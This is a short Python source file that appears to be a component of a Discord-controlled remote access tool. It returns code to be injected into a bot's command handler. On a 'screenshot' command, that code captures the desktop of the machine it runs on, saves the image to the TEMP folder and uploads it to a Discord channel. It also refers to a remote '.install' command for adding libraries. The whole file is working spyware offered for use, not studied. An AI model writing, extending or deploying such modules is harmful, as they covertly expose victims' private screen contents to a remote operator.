# THIS COMPONENT WILL:
# make a screenshot of the desktop and send it through discord.
# ----------------------
# TODO:
# -screenshot
def get_dependencies():
    return """
import pyautogui
"""
def get_code():
    return """

    # ADDED SCREENSHOT MODULE
    elif message.content.lower().startswith("screenshot"):
        try:
            screenshot = pyautogui.screenshot()
            path = os.path.join(os.getenv("TEMP"), "screenshot.png")
            screenshot.save(path)
            file = discord.File(path)
            embed = discord.Embed(title="Screenshot", color=0xfafafa)
            embed.set_image(url="attachment://screenshot.png")
            await message.channel.send(embed=embed, file=file) 
        except ImportError:
            await message.channel.send("pyautogui is not installed. Please install it using `.install pyautogui`.")
            return

"""
